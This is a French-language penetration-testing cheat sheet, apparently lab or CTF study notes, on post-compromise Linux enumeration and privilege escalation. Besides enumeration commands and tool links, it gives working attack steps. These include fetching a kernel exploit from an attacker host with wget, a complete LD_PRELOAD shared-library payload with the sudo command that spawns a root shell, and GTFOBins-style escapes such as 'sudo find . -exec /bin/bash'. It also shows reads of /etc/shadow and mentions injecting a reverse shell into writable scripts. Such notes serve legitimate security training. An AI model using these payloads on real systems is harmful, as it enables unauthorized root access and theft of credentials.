# 🐧 Énumération Système Linux – Reconnaissance Post-Compromise 🔍

📍 **Commandes essentielles pour mapper un système Linux après intrusion !**

---

## 🖥️ Informations système de base

| 🧰 Commande | 💻 Syntaxe | 🔍 Usage |
|-------------|------------|----------|
| `hostname` | `hostname` | Affiche le nom d'hôte (peut révéler le rôle : SQL-PROD-01) |
| `uname` | `uname -a` | Informations kernel détaillées pour recherche d'exploits |
| `proc version` | `cat /proc/version` | Version kernel + infos compilateur (GCC présent ?) |
| `issue` | `cat /etc/issue` | Identification OS (facilement modifiable) |

💡 *Le hostname peut révéler le rôle du serveur dans l'infrastructure*

---

## 🔄 Processus et environnement

| 🧰 Commande | 💻 Syntaxe | 🔍 Usage |
|-------------|------------|----------|
| `ps` basique | `ps` | Processus du shell courant uniquement |
| `ps` complet | `ps -A` | Tous les processus en cours d'exécution |
| `ps` arborescence | `ps axjf` | Vue hiérarchique des processus |
| `ps` détaillé | `ps aux` | Processus + utilisateurs + infos détaillées |
| `env` | `env` | Variables d'environnement (PATH, compilateurs) |

💡 *ps aux révèle les processus de tous les utilisateurs avec détails*

---

## 👤 Utilisateurs et privilèges

| 🧰 Commande | 💻 Syntaxe | 🔍 Usage |
|-------------|------------|----------|
| `sudo` check | `sudo -l` | Liste les commandes sudo autorisées |
| `id` courant | `id` | Privilèges et groupes de l'utilisateur courant |
| `id` autre | `id username` | Privilèges d'un autre utilisateur |
| `passwd` | `cat /etc/passwd` | Liste tous les utilisateurs système |
| `passwd` filtré | `cat /etc/passwd \| grep home` | Utilisateurs réels avec dossier home |

💡 *sudo -l peut révéler des escalades de privilèges directes*

---

## 📁 Exploration fichiers

| 🧰 Commande | 💻 Syntaxe | 🔍 Usage |
|-------------|------------|----------|
| `ls` détaillé | `ls -la` | Affiche fichiers cachés et permissions |
| `history` | `history` | Historique commandes (mots de passe parfois) |

---

## 🌐 Réseau et connectivité

| 🧰 Commande | 💻 Syntaxe | 🔍 Usage |
|-------------|------------|----------|
| `ifconfig` | `ifconfig` | Interfaces réseau (pivoting possible ?) |
| `ip route` | `ip route` | Routes réseau configurées |
| `netstat` global | `netstat -a` | Toutes les connexions et ports en écoute |
| `netstat` TCP/UDP | `netstat -at` / `netstat -au` | Filtre par protocole TCP ou UDP |
| `netstat` écoute | `netstat -l` | Ports en écoute uniquement |
| `netstat` stats | `netstat -s` | Statistiques par protocole |
| `netstat` processus | `netstat -tp` | Connexions avec PID/nom processus |
| `netstat` complet | `netstat -ano` | Affichage complet sans résolution DNS |
| `netstat` interfaces | `netstat -i` | Statistiques des interfaces réseau |

💡 *netstat -tp nécessite des privilèges pour voir les PID*

---

## 🔍 Recherche avec find

### 📄 Recherche de fichiers
| 🎯 Objectif | 💻 Commande | 🔍 Usage |
|-------------|-------------|----------|
| Fichier spécifique | `find . -name flag1.txt` | Cherche dans le répertoire courant |
| Dans répertoire | `find /home -name flag1.txt` | Cherche dans /home |
| Répertoire | `find / -type d -name config` | Cherche dossier nommé config |
| Permissions 777 | `find / -type f -perm 0777` | Fichiers rwx pour tous |
| Exécutables | `find / -perm a=x` | Fichiers exécutables |
| Par utilisateur | `find /home -user frank` | Fichiers de l'user frank |

### ⏰ Recherche temporelle
| 🎯 Objectif | 💻 Commande | 🔍 Usage |
|-------------|-------------|----------|
| Modifiés récemment | `find / -mtime 10` | Modifiés dans les 10 derniers jours |
| Accédés récemment | `find / -atime 10` | Accédés dans les 10 derniers jours |
| Changés 1h | `find / -cmin -60` | Changés dans la dernière heure |
| Accédés 1h | `find / -amin -60` | Accédés dans la dernière heure |

### 📏 Recherche par taille
| 🎯 Objectif | 💻 Commande | 🔍 Usage |
|-------------|-------------|----------|
| Taille exacte | `find / -size 50M` | Fichiers de 50MB exactement |
| Plus grands | `find / -size +100M` | Fichiers > 100MB |
| Plus petits | `find / -size -10M` | Fichiers < 10MB |

### 🔓 Permissions spéciales
| 🎯 Objectif | 💻 Commande | 🔍 Usage |
|-------------|-------------|----------|
| Dossiers modifiables | `find / -writable -type d 2>/dev/null` | World-writable directories |
| Permissions 222 | `find / -perm -222 -type d 2>/dev/null` | Autre syntaxe write |
| SUID bit | `find / -perm -u=s -type f 2>/dev/null` | Fichiers avec bit SUID |
| Exécutables world | `find / -perm -o x -type d 2>/dev/null` | Dossiers exécutables par tous |

### 🛠️ Outils de développement
| 🎯 Objectif | 💻 Commande | 🔍 Usage |
|-------------|-------------|----------|
| Perl | `find / -name perl*` | Interpréteur Perl installé |
| Python | `find / -name python*` | Interpréteur Python installé |
| GCC | `find / -name gcc*` | Compilateur C installé |

💡 *Toujours ajouter `2>/dev/null` pour masquer les erreurs*


# 🛠️ Outils d'Énumération Linux – Gain de temps ⏳

📍 **Outils populaires pour accélérer l’énumération, à utiliser avec prudence car certains vecteurs peuvent être manqués**

---

## Outils principaux

| 🔧 Outil | 📦 Langage/Env | 🔗 Lien GitHub | 📝 Description courte |
|----------|----------------|---------------|----------------------|
| LinPEAS | Bash / multiples | [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) | Script complet d’énumération automatisée, détecte nombreuses failles d’escalade |
| LinEnum | Bash | [LinEnum](https://github.com/rebootuser/LinEnum) | Script classique, simple et efficace pour audit rapide de la machine |
| LES (Linux Exploit Suggester) | Python | [LES](https://github.com/mzet-/linux-exploit-suggester) | Propose exploits connus adaptés à la version kernel détectée |
| Linux Smart Enumeration | Bash | [LSE](https://github.com/diego-treitos/linux-smart-enumeration) | Énumération intelligente, filtre les résultats pour rapidité et pertinence |
| Linux Priv Checker | Python | [Linux Priv Checker](https://github.com/linted/linuxprivchecker) | Vérification automatisée des failles d’escalade classiques |

---

💡 *Choisir l’outil selon l’environnement cible (langage installé, droits d’exécution) et préférer maîtriser plusieurs outils pour ne rien manquer.*

# ⚡ Escalade de Privilèges Kernel – Techniques clés

---

## Identification  
- `uname -r` : connaître la version exacte du kernel  
- Vérifier patchs et vulnérabilités spécifiques à la version

---

## Recherche d’exploits  
- Utiliser `searchsploit` ou [exploit-db](https://www.exploit-db.com/) avec la version kernel  
- Consulter [CVE Details](https://www.cvedetails.com/) pour vulnérabilités récentes  
- Outils : LES (Linux Exploit Suggester) pour suggestions automatisées (faux positifs possibles)

---

## Exécution  
- Transférer exploit via Python SimpleHTTPServer :  
  `python3 -m http.server 80` (sur machine locale)  
  `wget http://<IP>/exploit.c` (sur cible)  
- Compiler si besoin (`gcc exploit.c -o exploit`)  
- Lancer exploit : `./exploit`  

---

## Vérifications post-exploit  
- Confirmer escalade root (`id`, `whoami`)  
- Surveiller stabilité système (éviter crash)  

---

## Conseils  
- Analyser le code source de l’exploit avant exécution  
- Tester dans un environnement contrôlé  
- Garder une copie propre du système pour restauration en cas d’échec

# ⚡ Escalade de Privilèges avec sudo et LD_PRELOAD – Techniques clés

---

## Vérification des droits sudo  
- `sudo -l` : liste les commandes sudo autorisées pour l’utilisateur  
- Utiliser [GTFOBins](https://gtfobins.github.io/) pour exploiter ces commandes

---

## Exploitation d’applications avec sudo  
- Exemple Apache2 :  
  `apache2 -f /etc/shadow` génère une erreur affichant la première ligne de `/etc/shadow` (fuite d’information)

---

## Escalade via LD_PRELOAD sous sudo

### Conditions  
- Option `env_keep` doit autoriser la conservation de `LD_PRELOAD`  
- Le real UID et effective UID doivent être identiques sinon `LD_PRELOAD` est ignoré

### Étapes  
1. Vérifier si `LD_PRELOAD` est conservé (`sudo -l` ou inspection sudoers)  
2. Écrire un code C minimal qui lance un shell root :  
\```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
\```
3. Compiler en bibliothèque partagée :  
\```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
\```
4. Exécuter une commande sudo avec `LD_PRELOAD` pointant vers la `.so` :  
\```bash
sudo LD_PRELOAD=/chemin/shell.so <commande_sudo>
\```
Exemple :  
\```bash
sudo LD_PRELOAD=/home/user/shell.so find
\```
Cela ouvre un shell root.

---

💡 *LD_PRELOAD permet d’injecter du code avant l’exécution d’un binaire, parfait pour escalader si sudo autorise la commande.*
---

## Autres astuces sudo

### Restriction sur commande unique  
- Si sudo autorise une seule commande spécifique, chercher des options pour exécuter d’autres commandes (ex: `find`, `less`, `vi`, `man`) via GTFOBins  
- Exemple :  
  - `sudo find . -exec /bin/bash \;` ouvre un shell root  
  - `sudo less /etc/shadow` permet de lire un fichier sensible

### Utiliser des scripts ou binaires accessibles  
- Si sudo permet d’exécuter un script modifiable, injecter un shell inverse ou commande pour escalader  

---

## Récapitulatif rapide

| Technique              | Description                               | Commandes clés                          |
|-----------------------|------------------------------------------|---------------------------------------|
| Vérification sudo     | Lister commandes autorisées                | `sudo -l`                             |
| Exploitation Apache2  | Fuite info via option config alternative  | `apache2 -f /etc/shadow`               |
| Escalade LD_PRELOAD   | Injection code via bibliothèque partagée  | Compilation C + `sudo LD_PRELOAD=...` |
| Exploits GTFOBins     | Utiliser commandes sudo autorisées malicieusement | [GTFOBins](https://gtfobins.github.io/) |
| Commandes interactives | Utiliser `find`, `less`, `vi` avec sudo  | `sudo find . -exec /bin/bash \;`      |

---

💡 *Toujours tester dans un environnement sécurisé avant utilisation en pentest réel.*
